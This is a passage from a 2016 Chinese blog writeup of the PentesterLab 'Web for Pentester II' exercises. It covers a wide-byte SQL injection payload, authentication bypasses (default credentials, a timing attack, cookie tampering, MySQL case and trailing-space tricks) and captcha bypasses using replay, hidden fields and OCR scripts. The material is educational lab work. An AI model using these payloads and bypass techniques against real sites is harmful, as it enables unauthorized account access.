<p>看到gdk就有想法了，应该是宽字节注入。<br/>但是只传入username一个为<code>%bf%27+or+1=1#</code>会报错说编码应为utf-8<br/>所以payload为<br/><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?username=%bf%27+<span class="keyword">or</span>+<span class="number">1</span>%3D1+%23&amp;password=%bf%27+<span class="keyword">or</span>+<span class="number">1</span>%3D1+%23&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</div></pre></td></tr></table></figure></p>
<h1 id="Authentication"><a class="headerlink" href="#Authentication" title="Authentication"></a>Authentication</h1><p>这一类型是身份认证的bypass</p>
<h2 id="example1-1"><a class="headerlink" href="#example1-1" title="example1"></a>example1</h2><p>认证窗口弹出来是说用户名为admin，让我猜猜看密码是什么<br/>然后随手一试<br/><figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attr">username</span> = admin</div><div class="line"><span class="attr">password</span> = admin</div></pre></td></tr></table></figure></p>
<p>然后就过了…6666</p>
<h2 id="example2-1"><a class="headerlink" href="#example2-1" title="example2"></a>example2</h2><p>第二关打开是这样的<br/>Username is hacker, now you need to find the password<br/>抓包看看也没什么想法，去web for pentest2的官网看了看，他是这么说的<br/><strong>This example is an exagerated version of a non-time-constant string comparison vulnerability. If you compare two strings and stop at the first invalid character, a string A with the first 6 characters in common with the string B will take more time to compare than a string A’ with only the first 2 characters in common with the string B. You can use this information to brute force the password in this example.</strong></p>
<p>说了一大堆也没有很看懂，好像是说6位的密码要花很长时间比较，而authentication是逐位比较的，所以正确的为一位位比较下去，这样就会花更长的时间，那么就可以写脚本跑了…（虽然我还是一脸懵比）<br/><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ ruby auth-example2.rb</div><div class="line"><span class="function"><span class="title">hacker</span>:a  -&gt;</span> <span class="number">1.4625000953674316</span></div><div class="line"><span class="function"><span class="title">hacker</span>:b  -&gt;</span> <span class="number">1.4070789813995361</span></div><div class="line"><span class="function"><span class="title">hacker</span>:c  -&gt;</span> <span class="number">1.407270908355713</span></div><div class="line">[...]</div><div class="line"><span class="function"><span class="title">hacker</span>:l  -&gt;</span> <span class="number">1.4061241149902344</span></div><div class="line"><span class="function"><span class="title">hacker</span>:m  -&gt;</span> <span class="number">1.4065420627593994</span></div><div class="line"><span class="function"><span class="title">hacker</span>:o  -&gt;</span> <span class="number">1.4070839881896973</span></div><div class="line"><span class="function"><span class="title">hacker</span>:p  -&gt;</span> <span class="number">1.6072182655334473</span></div><div class="line">[...]</div><div class="line"><span class="function"><span class="title">hacker</span>:4  -&gt;</span> <span class="number">1.4077167510986328</span></div><div class="line"><span class="function"><span class="title">hacker</span>:5  -&gt;</span> <span class="number">1.4075558185577393</span></div><div class="line"><span class="function"><span class="title">hacker</span>:6  -&gt;</span> <span class="number">1.40665602684021</span></div><div class="line"><span class="function"><span class="title">hacker</span>:7  -&gt;</span> <span class="number">1.4062080383300781</span></div><div class="line"><span class="function"><span class="title">hacker</span>:8  -&gt;</span> <span class="number">1.4082770347595215</span></div><div class="line"><span class="function"><span class="title">hacker</span>:9  -&gt;</span> <span class="number">1.407080888748169</span></div></pre></td></tr></table></figure></p>
<p>明显p比较久，这样就继续跑，最后得到密码是p4ss0rd</p>
<h2 id="example3-1"><a class="headerlink" href="#example3-1" title="example3"></a>example3</h2><p>打开有个登陆框，给了个测试账号，题目是说需要用admin的身份登陆，不知道为什么爆了500的错误，没办法那就不做了，看看官方文档</p>
<p><strong>In this exercise, you can log in as user1, your goal is too get logged in as admin. To do so, you need to carefully look at the response sent back by the server.</strong></p>
<p><strong>You can see that when you log in as user1, you get a cookie named user1, from that you can easily modify this value (using a proxy or a browser’s extension) to get logged in as admin.</strong></p>
<p>比较清晰，大概是说cookie里面有个字段是user，修改为admin就可以了</p>
<h2 id="example4-1"><a class="headerlink" href="#example4-1" title="example4"></a>example4</h2><p>和上题差不多。</p>
<p><strong>This example is similar to the previous example. As soon as you receive a cookie from an application is always good to see what it looks like, try to crack using a password cracker or try to just Google it. From that you should be able to generate a valid cookie for the user admin.</strong></p>
<p><strong>If you get many times the same session id when logging in: there is a problem! If you log in from a clean browser, you should never get two times the same cookies.</strong></p>
<p>大概意思是说cookie不会改变，意味着cookie中存储了账号密码的信息，就好像如果你使用干净的浏览器，你不会两次都得到相同的cookie，除非cookie中存储着什么。</p>
<h2 id="example5"><a class="headerlink" href="#example5" title="example5"></a>example5</h2><p>打开是个登陆版还有注册功能，那么稍微猜猜看应该是业务逻辑漏洞了<br/><strong>This example shows the consequence of different method of string comparison. When you create a user, the application will check programmatically that the user does not exist by comparing the username provided with the existing user. When you log in, the application will check that your username and password are correct, then it will save your username in your session. Finally, every time you will access the application, the application will retrieve your user’s details based on the username provided in the session.</strong></p>
<p><strong>The trick here comes from the fact that the comparison when you create a user is done programmaticaly (i.e.: in Ruby) but when the user’s details get retrieved, the comparison is done by the database. And by default, MySQL (with the type VARCHAR) will perform a case insensitive comparison: “admin” and “Admin” are the same value.</strong></p>
<p><strong>Using that information, you should be able to create a user that will be identified as admin.</strong></p>
<p>看起来没错，是注册的时候判断没有做大小写判断，于是产生了注册覆盖，那么注册一个Admin就可以过了</p>
<h2 id="example6-1"><a class="headerlink" href="#example6-1" title="example6"></a>example6</h2><p><strong>To remediate the previous issue, the developer decided to use a case sensitive comparison during users’ creation. This check can also be bypassed based on the way MySQL performs string comparison: MySQL ignores trailing spaces (i.e.: pentesterlab and pentesterlab are equals). Using the same method as above, you should be able to pretend to be logged in as the user admin.</strong></p>
<p><strong>A good way to prevent this issue is to tell the database that the username is a PRIMARY KEY. This method is, for example, used in Tomcat documentation to use a SQL backend as a Realm.</strong></p>
<p>不知道为什么这类型的题目都会报500，没办法，只能看官方文档猜猜看，基本说的很清楚，mysql会忽略尾随在字符串后面的空格，利用这种方式，就可以进行注册覆盖了，还是比较简单的。</p>
<h1 id="captcha"><a class="headerlink" href="#captcha" title="captcha"></a>captcha</h1><p>这里的的所有题目都是关于captcha的验证的，有各种各样奇怪的captcha bypass方式。</p>
<h2 id="example1-2"><a class="headerlink" href="#example1-2" title="example1"></a>example1</h2><p>第一题打开时验证码，试了试没觉得有什么问题，那么就去看看源码吧，看到了一句有趣的判断<br/><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> params[<span class="symbol">:captcha</span>] <span class="keyword">and</span> params[<span class="symbol">:captcha</span>] != session[<span class="symbol">:captcha</span>]</div><div class="line"><span class="comment"># ERROR: CAPTCHA is invalid redirect</span></div></pre></td></tr></table></figure></p>
<p>这里看到有个captcha存在性的判断，所以如果并没有传入captcha这个参数，就不会进入判断，成功绕过。</p>
<h2 id="example2-2"><a class="headerlink" href="#example2-2" title="example2"></a>example2</h2><p>第二题打开发现第一题的洞还在，但估计应该不是这样的做法，查看页面源码的时候突然发现有个隐藏的answer,<br/><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> <span class="built_in">value</span>=<span class="string">"KhXFGIHZIc"</span> name=<span class="string">"answer"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>有可能是测试的时候忘记删除导致的漏洞吧…</p>
<h2 id="example3-2"><a class="headerlink" href="#example3-2" title="example3"></a>example3</h2><p>这回同样是类似于由于开发人员疏漏导致的问题，这次打开发现之前的input的消失了，但是却发现cookie多了一项captcha，里面就是验证码，get</p>
<h2 id="example4-2"><a class="headerlink" href="#example4-2" title="example4"></a>example4</h2><p>第4题打开没找到什么洞，去看看官方文档吧。</p>
<p><strong>This is quite a funny example since it’s a mistake I made during the development of this set of exercises.</strong></p>
<p><strong>Here, you don’t have to really crack the captcha, you just need to crack it once and you can reuse the same value and session id to perform the same request again and again. When you try to crack a captcha, make sure that an answer can only be used once. You can easily script this exploitation by writing a script that takes a session id and a value for parameters and submit them again and again.</strong></p>
<p>好吧我承认没有搞明白怎么回事…</p>
<h2 id="example5-1"><a class="headerlink" href="#example5-1" title="example5"></a>example5</h2><p>打开发现验证码是类似于单词这样的东西，不是很懂，去看看官方文档…</p>
<p><strong>This example is the last example of weakness, here the weakness comes from the dictionnary used to create the captcha, there is only a limited number of words used. You can easily write a cracker by generating a list of all words and the MD5 of the image. Then when you want to submit the form, you just need to retrieve the image, compute its MD5 and submit the matching word.</strong></p>
<p>大概说我们很容易通过枚举单词来比较验证码的正确，类似于弱口令吧。</p>
<h2 id="example6-2"><a class="headerlink" href="#example6-2" title="example6"></a>example6</h2><p>这次的比较清晰了，打开是很弱的验证码，找一些工具就可以识别这样的图片了，官方文档是这么说的。<br/><strong>In this example, we are going to use the OCR tool (Tesseract) to crack this easy captcha. The goal here is to build a script that will get an high success rate.</strong></p>
<p><strong>Just with a basic script using tesseract you can expect a success rate of more than 95%. You will need to use the following algorithm:</strong></p>
<p><strong>Go to the main page <a href="http://vulnerable/captcha/example6/" rel="external" target="_blank">http://vulnerable/captcha/example6/</a> to get a new captcha and the cookie (rack.session).</strong><br/><strong>Retrieve the image.</strong><br/><strong>Run tesseract on the image and retrieve the result.</strong><br/><strong>Submit the result with the correct cookie.</strong><br/><strong>The following things can improved your success rate:</strong></p>
<p><strong>Only submit a value if it’s a word.</strong><br/><strong>Only submit a value if it only contains of lower case characters.</strong><br/><strong>Depending on the application workflow, you may want to have a really high success rate. For example, if you spend 10 minutes filling forms, you want to make sure that the captcha cracker has a high success rate. Where if it’s only to exploit a SQL injection, you can just retry until you find the right value and you don’t need to be really accurate.</strong></p>
<p>他推荐了ocr tool这个工具，在识别的时候还可以加一些优化，剔除一些不是单词的，在剔除一些只有小写字母的。</p>
<h2 id="example7-1"><a class="headerlink" href="#example7-1" title="example7"></a>example7</h2><p>只是加了一些蓝色的线基本是不解决问题的，很容易处理这样的图片。<br/><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">require <span class="string">'RMagick'</span></div><div class="line"><span class="built_in">image</span> = Magick::Image.<span class="built_in">read</span>(<span class="string">"current7.png"</span>).first</div><div class="line"><span class="built_in">image</span> = <span class="built_in">image</span>.threshold(THRESHOLD)</div><div class="line"><span class="built_in">image</span>.<span class="built_in">write</span>(<span class="string">"current7.png"</span>)</div></pre></td></tr></table></figure></p>
<p>噢，代码可能是ruby写的。。。</p>
<h2 id="example8-1"><a class="headerlink" href="#example8-1" title="example8"></a>example8</h2><p>到这里发现验证码已经回到原来的样子了，之前是通过别的漏洞搞得，现在试着恢复吧。<br/><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">require <span class="string">'RMagick'</span></div><div class="line"><span class="built_in">image</span> = Magick::Image.<span class="built_in">read</span>(<span class="string">"current8.png"</span>).first</div><div class="line"><span class="built_in">image</span> = <span class="built_in">image</span>.implode(IMPLODE)</div><div class="line"><span class="built_in">image</span> = <span class="built_in">image</span>.threshold(THRESHOLD)</div><div class="line"><span class="built_in">image</span>.<span class="built_in">write</span>(<span class="string">"current8.png"</span>)</div></pre></td></tr></table></figure></p>
<p>加上筛选，成功率还是有一些的，</p>
<h2 id="example9-1"><a class="headerlink" href="#example9-1" title="example9"></a>example9</h2><p>打开发现是算式的验证码，那么很简单，python里用eval就可以了，懒得写脚本…</p>
<h1 id="Authorization"><a class="headerlink" href="#Authorization" title="Authorization"></a>Authorization</h1><p>由于这部分开始镜像血崩了，基本开什么都报500，无奈下只能放弃了，不过从官方的文档中还是能获得很多东西。</p>
<p><img alt="https://pentesterlab.com/exercises/web_for_pentester_II/course" src="./web_for_pentest_II writeup  LoRexxar's Blog/course"/><br/>有时候会打不开，但好像不是因为gfw的原因。</p>
</div>
</div>
<div class="copyright">
<p><span>本文标题:</span><a href="/2016/03/30/web-for-pentest-II/">web_for_pentest_II writeup</a></p>
<p><span>文章作者:</span><a href="/" title="回到主页">LoRexxar</a></p>
<p><span>发布时间:</span>2016-03-30, 10:52:08</p>
<p><span>最后更新:</span>2016-04-02, 20:19:12</p>
<p>
<span>原始链接:</span><a class="post-url" href="/2016/03/30/web-for-pentest-II/" title="web_for_pentest_II writeup">http://lorexxar.cn/2016/03/30/web-for-pentest-II/</a>
<span class="copy-path" data-clipboard-text="原文: http://lorexxar.cn/2016/03/30/web-for-pentest-II/　　作者: LoRexxar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
<script> var clipboard = new Clipboard('.copy-path'); </script>
</p>
<p>
<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank" title="CC BY-NC-SA 4.0 International">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
</div>
<nav id="article-nav">
<div class="article-nav-title" id="article-nav-newer">
<a href="/2016/04/04/phpblack/">
                    is_numeric和trim导致的判断绕过
                </a>
</div>
<div class="article-nav-title" id="article-nav-older">
<a href="/2016/03/22/bctf2016/">
                    bctf2016
                </a>
</div>
</nav>
</article>
<div class="toc-article" id="toc">
<strong class="toc-title">文章目录</strong>
<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-injections"><span class="toc-number">1.</span> <span class="toc-text">SQL injections</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#example1"><span class="toc-number">1.1.</span> <span class="toc-text">example1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example2"><span class="toc-number">1.2.</span> <span class="toc-text">example2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example3"><span class="toc-number">1.3.</span> <span class="toc-text">example3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example4"><span class="toc-number">1.4.</span> <span class="toc-text">example4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example-5"><span class="toc-number">1.5.</span> <span class="toc-text">example 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example6"><span class="toc-number">1.6.</span> <span class="toc-text">example6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example7"><span class="toc-number">1.7.</span> <span class="toc-text">example7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example8"><span class="toc-number">1.8.</span> <span class="toc-text">example8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example9"><span class="toc-number">1.9.</span> <span class="toc-text">example9</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Authentication"><span class="toc-number">2.</span> <span class="toc-text">Authentication</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#example1-1"><span class="toc-number">2.1.</span> <span class="toc-text">example1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example2-1"><span class="toc-number">2.2.</span> <span class="toc-text">example2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example3-1"><span class="toc-number">2.3.</span> <span class="toc-text">example3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example4-1"><span class="toc-number">2.4.</span> <span class="toc-text">example4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example5"><span class="toc-number">2.5.</span> <span class="toc-text">example5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example6-1"><span class="toc-number">2.6.</span> <span class="toc-text">example6</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#captcha"><span class="toc-number">3.</span> <span class="toc-text">captcha</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#example1-2"><span class="toc-number">3.1.</span> <span class="toc-text">example1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example2-2"><span class="toc-number">3.2.</span> <span class="toc-text">example2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example3-2"><span class="toc-number">3.3.</span> <span class="toc-text">example3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example4-2"><span class="toc-number">3.4.</span> <span class="toc-text">example4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example5-1"><span class="toc-number">3.5.</span> <span class="toc-text">example5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example6-2"><span class="toc-number">3.6.</span> <span class="toc-text">example6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example7-1"><span class="toc-number">3.7.</span> <span class="toc-text">example7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example8-1"><span class="toc-number">3.8.</span> <span class="toc-text">example8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#example9-1"><span class="toc-number">3.9.</span> <span class="toc-text">example9</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Authorization"><span class="toc-number">4.</span> <span class="toc-text">Authorization</span></a></li></ol>
</div>
<style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>
<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
<script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>
<div class="share">
<div class="bdsharebuttonbox">
<a class="fa fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到推特"></a>
<a class="fa fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
<a class="fa fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
<a class="fa fa-files-o bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
<a class="fa fa fa-envelope-o bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
<a class="fa fa-weixin bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
<a class="fa fa-share-alt bds_more" data-cmd="more" href="#"></a></div></div></div></div></div></body></html>

<script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"web_for_pentest_II writeup　| LoRexxar's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>

<section class="youyan" id="comments">
<script>
        var loadComment = function(){
            var d = document, s = d.createElement('script');
            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2127998';
            (d.head || d.body).appendChild(s);
        }
    </script>
<script> loadComment(); </script>
<div id="uyan_frame"></div>
</section>
<div class="scroll" id="post-nav-button">
<a href="/2016/04/04/phpblack/" title="上一篇: is_numeric和trim导致的判断绕过">
<i class="fa fa-angle-left"></i>
</a>
<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
<a href="/2016/03/22/bctf2016/" title="下一篇: bctf2016">
<i class="fa fa-angle-right"></i>
</a>
</div>
<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/16/nonce-bypass-script/">通过浏览器缓存来bypass CSP script nonce</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/pppctf2017/">PlaidCTF 2017 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/xss-bot2/">xss bot从入门到弃坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/09/CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy/">CSP Is Dead, Long Live CSP! 翻译</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/24/pwnhub-jue/">pwnhub 绝对防御 出题思路和反思</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/Shadow-Brokers/">Shadow Brokers大新闻整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/360chunqiu2017/">360春秋杯2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/18/bctf2017-web/">bctf2017 web部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/27/pwnhub-xiaom/">pwnhub 之小m的复仇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/21/0ctf2017-web/">0ctf201 web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/njctf2017-wp/">NJCTF Web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/pwnhub-another-php/">pwnhub_another php web部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/zctf2017-writeup/">zctf2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/20/pwnhub-open/">pwnhub 打开电脑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/cdn-bypass-csp/">有趣的cdn bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/hctf2016-something/">聊聊hctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnhub-shen/">pwnhub 深入敌后</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/03/33c3-wp/">33c32016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/26/pwnhub_mi/">pwnhub_迷</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/xss-protect/">浅谈xss的后台守护问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai2/">pwnhub_拍卖行</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai/">pwnhub_找朋友</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/10/pwnhub-WTF-writeup/">pwnhub_WTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/07/polyglot-JPEGs-bypass-csp/">using polyglot JPEGs bypass CSP 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/03/redis-getshell/">通过redis getshell的一些小问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/01/hctf2016-other/">hctf2016 简单部分WEB &amp;&amp; misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/30/hctf2016-xss/">hctf2016 guestbook&amp;secret; area writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/29/hctf2016-ATField/">HCTF2016 ATField writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/web2-giligili/">hctf2016 giligili writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/31/csp-then2/">CSP进阶-302 Bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/28/csp-then/">CSP进阶-link Bypass unsafe line</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/ctf-start/">什么是ctf呢？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/hitcon2016-misc/">hitcon2016 misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/hitcon2016/">hitcon2016 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/03/Lctf2016/">L-ctf2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/14/php-wei/">php 伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/huashanbei2016/">华山杯2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/29/crypto-start/">crypto 简单的RSA</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/18/sqlmap-source4/">sqlmap 源码分析（四）开始注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/sqlmap-source3/">sqlmap 源码分析（三）在注入之前</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/11/sqlmap-source2/">sqlmap 源码分析（二）初始化</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/sqlmap-source1/">sqlmap 源码分析（一）开始、参数解析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/08/ccsp/">CSP Level 3浅析&amp;简单的bypass</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/07/python-virtualenv/">python virtualenv沙盒命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/xnuca-ctf-wp/">XNUCA2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/21/python-tqdm/">python tqdm模块分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/cmd-shell/">shell上一些有趣的命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/17/sangebaimao_huobi/">sangebaimao之火币网</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/12/guosai-ctf-wp/">信息安全国赛技能赛 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/26/cloudeye/">一个有趣的东西-cloudeye</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/sangebaimao-zhao/">sangebaimao之招聘又开始了，你怕了吗？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/06/alictf2016/">alictf2016_web_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/sangebaimao1/">sangebaimao 寻找来自星星的你一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/27/opcache-jcfx/">在php opcache检测隐藏的后门程序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/12/php-shell/">php webshell 各种函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/asis-bcloud/">Asis2016_Binary Cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/09/sctf2016/">sctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/05/dockerfile/">dockerfile  (・ω・)ノ</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/04/docker-jc/">docker 基础操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/02/ggctf2016/">google_ctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/cctf2016/">CCTF2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/20/gif-ccsp/">gif bypass CSP?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/j123jt-wp/">j123jt的聊天板大型wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/sctf-Obfusion/">sctfq1_Obfusion_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/input-bypasscsrf/">input属性bypass csp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/06/hctfgame-llfx/">hctfgame_ll的流量分析题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/phpblack/">is_numeric和trim导致的判断绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/web-for-pentest-II/">web_for_pentest_II writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/bctf2016/">bctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/hctfgame_week4+5_writeup/">hctf_game_week4+5_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0ctf2016/">0ctf2016 &amp;&amp; sunshinectf2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/bkp2016-writeup/">bkp2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/05/hexo-coding/">hexo转移到coding配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/ssctf2015-writeup/">ssctf2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/hctfgame_week3_writeup/">hctf_game_week3_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/ldpai/">ldpa简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/titan-souls-ez/">titan souls 普通模式通关攻略</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/easy_git/">简单的git教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week2_writeup/">hctf_game_week2_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week1_writeup/">hctf_game_week1_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week0_writeup/">hctf_game_week0_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/21/dmsj-book/">《代码审计》一点儿笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/hctf2015/">hctf2015的一点儿记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/xss-link/">xss link&amp;svg;黑魔法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/sql-error/">SQL 显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/rctf2015/">RCTF2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/isg2015/">ISG2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/02/hsb/">SPWC &amp; 华山杯？ writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/24/sqli_h/">关于sqli注入的特殊函数</a></li><li class="post-list-item"><a class="post-list-link" 